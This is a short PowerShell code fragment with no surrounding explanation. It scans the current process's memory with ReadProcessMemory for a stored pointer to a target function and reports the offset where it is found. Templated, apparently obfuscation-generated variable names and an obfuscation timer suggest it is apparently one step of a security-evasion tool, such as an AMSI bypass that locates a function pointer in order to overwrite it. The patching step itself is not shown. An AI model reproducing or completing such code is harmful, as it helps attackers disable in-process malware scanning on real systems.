$Handle = [APIs]::GetCurrentProcess()
$Dummy = 0
$ApiReturn = $false

for ($j = $I$_Start; $j -lt $M$_Offset; $j += $N$_Offset) {
    $PtrToSearch = [Int64]$FuncPtr - $j
    $MemArr = [byte[]]::new($R$_Bytes)
    $ApiReturn = [APIs]::ReadProcessMemory($Handle, $PtrToSearch, $MemArr, $R$_Bytes, [ref]$Dummy)
    for ($i = 0; $i -lt $MemArr.Length; $i += 1) {
        $Bytes = $MemArr[$i..($i + 7)]
        $Pointer = [BitConverter]::ToInt64($Bytes, 0)
        if ($Pointer -eq $Func) {
            Write-Host "Found @ $($j): $($i)!"
            $Memory = [Int64]$PtrToSearch + $i
            break
        }
    }
}
$Finish = Get-Date
Write-Host "Execution Time: $((($Finish - $ObfInit).TotalSeconds)) seconds"
